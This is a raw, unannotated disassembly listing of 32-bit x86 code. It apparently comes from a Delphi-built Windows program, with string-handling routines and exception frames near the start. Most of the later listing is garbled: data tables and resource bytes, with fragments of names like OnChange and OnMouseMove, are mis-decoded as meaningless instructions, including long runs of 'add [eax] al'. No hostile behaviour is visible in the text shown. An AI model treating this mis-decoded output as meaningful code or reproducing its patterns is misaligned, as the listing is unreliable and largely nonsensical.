sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_404108
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_40422c
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4702e4
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_404108
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_4041e8
sub_4706f0
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_4041e0
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_4041e0
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_4041e0
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_4041e0
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_4702e4
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_470774
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_4041e0
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4041e0
mov edx eax
dec edx
mov eax esi
call sub_4702e4
cmp al 0x6
jne r-xdata
mov eax esi
call sub_4041e0
mov edx eax
sub edx 0x2
mov eax esi
call sub_4702e4
cmp al 0x6
je r-xdata
mov eax esi
call sub_4041e0
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_4041e0
mov edx eax
sub edx 0x3
mov eax esi
call sub_4702e4
cmp al 0x6
jne r-xdata
sub_4707e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_47085d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_403f20
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470864
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_4702e4
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_404108
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4041e8
mov eax [ ebp - 0x4 ]
sub_47086c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4708b1
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4707e0
mov eax [ ebp - 0x4 ]
call sub_4041e0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4708b8
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_4708c0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_4041e0
mov edx eax
mov eax edi
call sub_47086c
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_4041e0
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_4702e4
cmp al 0x3
je r-xdata
sub_47091c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4708c0
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4702e4
dec eax
sub al 0x2
setb bl
sub_470944
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_470ac9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_470438
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_403f74
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_470438
mov [ ebp - 0x9 ] al
test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_404440
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_4041e0
mov ecx eax
mov edx esi
mov eax edi
call sub_404440
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404440
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_40422c
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4041e0
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_404440
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404440
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_40422c
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_4041e0
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_404440
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_4041e8
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470ad0
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_403f44
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_404108
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_4041e8
dec esi
jne r-xdata
sub_470adc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_470ca2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_403f74
mov eax esi
call sub_4041e0
test eax eax
jle r-xdata
mov eax esi
call sub_4041e0
mov edx eax
mov eax esi
call sub_47086c
mov edi eax
mov eax [ ebx ]
call sub_4041e0
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_4041e0
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_4041e0
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_470944
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_403f74
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_47086c
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_4041e0
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_4041e0
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470ca9
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403f44
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4702e4
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_4041e0
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_47091c
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_470944
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_403f74
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_4704b4
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_404108
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_4041e8
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_4043ec
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_4704b4
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_470cb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470cd9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470ce0
retn
sub_470d17
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0xbffb8f2 ] ch
push cs
inc edi
add [ eax + 0x2 ] al
add [ eax ] al
test ch bl
inc ebx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
call 0x284751aa
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + ebx ] cl
inc edi
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax * 2 + 0x64454244 ] cl
imul esi [ ebp + eax * 2 + 0x72 ] 0x8d726f72
inc eax
add [ ebp + ecx + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
push cs
inc edi
add [ eax ] cl
cmova eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
stosb [ edi ]
push cs
inc edi
add ah dh
sub_471011
push ds
inc esp
add [ eax + 0x2000441f ] dh
and [ eax + eax - 0x40 ] al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add [ esi + ecx + 0x45 ] bh
add ah al
and [ eax + eax - 0x64 ] al
cmp al [ ebp ]
insb
sbb [ ebp ] al
nop
dec esp
inc ebp
add [ eax ] bl
aaa
inc ebp
add [ eax ] cl
cmp al [ ebp ]
cwde
sbb al [ eax + eax - 0x2c ]
sbb al 0x44
add [ eax + 0x5800441c ] dl
push ds
inc esp
add [ ebx + 0x1cb40044 ] al
inc esp
add [ eax + 0x22 ] ch
inc edi
add [ ebp + ebx + 0x22700044 ] bh
inc edi
add [ edx + 0x47 ] dh
add al ah
xor [ edi ] eax
and al 0x2b
arpl [ eax + eax + 0x10 ] si
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or [ ebp + ecx * 2 + 0x61 ] edx
jae r-xdata
test [ esi + 0x1650044 ] cl
add bh bh
adc [ eax + 0x45 ] cl
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
inc ebp
imul esi [ fs : eax + edi * 2 + 0xf ] 0xf040047
inc edi
add [ eax ] al
add al 0x4d
popad
jae r-xdata
adc eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x30ff0001
dec eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
[ edi + eax * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
insb
mov es [ eax + eax + 0x62 ]
add [ eax ] eax
jmp eax
xor eax 0x447f4c00
add [ ecx ] ah
add bh bh
loopne r-xdata
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
jb r-xdata
add [ eax ] al
push ss
add [ eax ] cl
inc ebx
push 0x61437261
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov al 0xd2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf065646f
daa
inc esi
add [ edx + eax ] cl
insb
dec edi
jne r-xdata
add [ eax ] al
add [ edx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
inc edi
add [ edx + ebp + 0x54090047 ] al
dec ebp
popad
jae r-xdata
inc esp
add [ ebp + eax * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
je r-xdata
inc esp
hlt
test al 0x1d
inc edx
add [ eax ] dh
add bh bh
sub al 0xd3
inc esp
add [ eax - 0x2d ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x17ff0000 ] 0x0
add eax 0x6f6c6f43
add bh bh
int3
jb r-xdata
add bh bh
loopne r-xdata
lea eax [ eax + eax + 0x63 ]
add [ eax ] eax
[ edi + eax * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add bh bh
pushfd
inc edi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3700ffff ] ah
cmp eax [ ebp ]
in al dx
cmp eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
add eax 0x336c7443
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050019 ] al
je r-xdata
insb
cmp ch bl
inc ebx
add [ ebx ] dl
add al [ eax ]
push eax
sbb al [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
add [ eax ] al
call [ edi ]
add [ 0x6f6c6f43 ] al
jg r-xdata
add [ eax ] cl
inc ecx
jne r-xdata
add [ esi ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
mov es [ eax + eax + 0x65 ]
add [ eax ] eax
call [ eax ]
dec eax
inc ebp
add [ eax ] al
adc eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ esp + esi * 8 + 0x77 ]
inc esp
ja r-xdata
add [ eax + eax ] dh
jmp [ eax - 0xa ]
lea eax [ eax + eax + 0x64 ]
add [ eax ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
or [ fs : esi + 0x44 ] bh
add [ ebp ] bl
add [ edx ] bh
add bh bh
jpe r-xdata
[ esi + ebx + 0x47 ]
jae r-xdata
add bh bh
insb
push ds
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4508001e ] al
imul esi [ fs : ebp + ecx * 2 + 0x61 ] 0x22486b73
inc edx
add [ eax ] ch
add bh bh
adc dl 0x44
add [ eax + 0x44d2 ] dl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001f ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070021 ] al
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add [ eax ] bh
pop ds
inc edi
add [ eax + 0x1f ] al
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or [ ebp + 0x61 ] ecx
js r-xdata
lea eax [ eax + eax - 0x7c ]
add [ eax ] eax
inc [ ecx + eax + 0x1ff00 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
pop es
dec ecx
insd
dec ebp
outsd
mov ah 0x8d
inc esp
outsd
insb
outsd
jle r-xdata
outsb
outsb
je r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ ebx ] cl
push eax
popad
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
jo r-xdata
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0xf8ff0001
cmp eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and eax 0x61500b00
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
jle r-xdata
ja r-xdata
push cs
je r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax - 0x2d ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
and al 0x3c
outsb
jne r-xdata
push eax
popad
jb r-xdata
adc [ eax ] al
0xff0000 0x44d3
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
add ah ah
sbb al [ edi ]
js r-xdata
inc ebp
add [ esp + edi + 0x10045 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
add [ esp + edi ] ah
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
popad
jae r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov eax 0x10044d2
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
je r-xdata
outsb
je r-xdata
jb r-xdata
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
add al [ eax ]
call [ esp + ebx + 0x44 ]
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] cl
push ebx
push 0x6948776f
outsb
inc ebx
push 0xc89c7261
adc [ eax ] al
cdq
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
outsb
inc ebx
push 0x65676e61
je r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9461618
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] dl
inc eax
add [ edi ] dl
inc ebp
add [ eax + eax ] bh
inc [ ecx + edx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
sub [ eax ] al
adc [ eax ] al
or eax 0xccff0002
sbb eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc esp
jb r-xdata
dec ebx
jns r-xdata
je r-xdata
push edi
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090038 ] al
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
jb r-xdata
add [ eax ] al
xor [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
loopne r-xdata
jo r-xdata
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
dec ebp
outsd
jne r-xdata
fadd [ eax ]
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060037 ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f070036 ] al
add [ eax ] al
dec edi
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
dec ebp
outsd
jne r-xdata
outsb
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0039 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or cl [ edi + 0x6e ]
outsb
dec edi
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add al [ eax ]
add [ ecx + rw-data ] ah
push ebp
jo r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
inc esp
outsd
ja r-xdata
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4419f0
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
add esp 0xfffffff0
call sub_4034f4
dec edi
outsb
push ebx
je r-xdata
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003a ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x246173b
inc ebp
outsb
inc esp
xor al 0x0
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
